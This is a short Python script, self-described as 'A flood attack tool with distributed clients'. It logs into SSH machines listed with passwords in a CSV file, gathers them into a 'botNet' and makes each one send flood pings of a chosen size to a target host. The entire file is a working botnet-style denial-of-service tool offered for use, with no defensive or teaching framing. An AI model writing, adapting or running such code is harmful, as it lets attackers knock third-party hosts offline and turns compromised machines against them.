#!/usr/bin/env python3
# encoding: utf-8

import argparse
from pexpect import pxssh
import csv

class Client(object):
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting!')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print('[*] Output from %s' % client.host)
        print('[+] %s\n' % output)


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)


def readClientsFromCSV(path='SSHCLIENTS.csv'):
    client = []
    with open(path, newline='') as csvfile:
        payload = csv.reader(csvfile, delimiter='\r', quotechar='|')
        for row in payload:
            row = [item.split(' ') for item in row]
            client.append(row.pop())
    return client


if __name__ == '__main__':
    botNet = []
    s = readClientsFromCSV()
    for client in s:
        botNet.append(Client(*client))

    parser = argparse.ArgumentParser(description='A flood attack tool with distributed clients')
    parser.add_argument('--host', help='Specify the target host')
    parser.add_argument('--size', help='Specify request packet size')

    args = parser.parse_args()
    targetPackageSize = args.size
    targetHost = args.host

    botnetCommand('ping %s -f -s %s' % (targetHost, targetPackageSize))
